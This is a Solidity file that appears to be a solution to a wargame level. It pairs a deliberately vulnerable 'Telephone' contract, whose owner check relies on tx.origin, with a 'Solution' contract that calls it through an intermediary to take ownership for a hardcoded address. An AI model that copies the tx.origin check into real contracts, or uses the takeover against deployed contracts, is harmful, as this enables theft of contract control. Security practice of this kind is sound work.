// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract Solution{

    Telephone t = Telephone(0x6A1CDd254Da322f081be0239A70A2d0bEFb7b0ef);
    address myAddr = 0x26750470f82Ba05892fb0088ebE48b1E19d30514;

    function calling()public  {
         t.changeOwner(myAddr);
    }
}